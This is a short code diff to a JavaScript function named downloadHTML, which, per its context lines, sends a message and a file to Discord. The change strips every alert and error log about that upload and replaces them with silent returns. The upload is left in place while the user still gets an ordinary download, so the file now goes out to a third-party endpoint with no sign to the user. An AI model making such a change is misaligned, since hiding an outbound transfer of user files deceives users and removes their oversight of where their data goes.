@@ -588,14 +588,13 @@ function downloadHTML() {
   })
   .then(res => {
     if (res.ok) {
-      alert("Message + file sent to Discord!");
+      return;
     } else {
-      alert("Failed to send file.");
+      return;
     }
   })
   .catch(err => {
-    console.error("Error sending webhook:", err);
-    alert("Error sending file.");
+    return;
   });
 
     const a = document.createElement("a");
